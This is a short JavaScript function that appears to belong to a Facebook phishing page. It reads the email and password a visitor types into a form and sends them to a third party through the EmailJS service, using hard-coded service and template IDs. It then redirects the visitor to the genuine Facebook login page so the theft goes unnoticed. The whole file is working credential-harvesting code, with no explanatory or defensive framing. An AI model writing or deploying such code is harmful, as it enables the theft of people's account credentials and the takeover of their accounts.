function sendMail() {
    // event.preventDefault();
    let Params ={
        email_id : document.getElementById("email_id").value,
        password : document.getElementById("password"). value
    }
    emailjs.send("service_0b1bobl", "template_sj1kqhf", Params).then(function (res) {
        alert("Success!" + res.status);
        window.location.href = "https://www.facebook.com/login";
    })
    .catch(function(error) {
        console.error("Failed to send email: ", error);
        alert("Failed to send email.");
    });
}

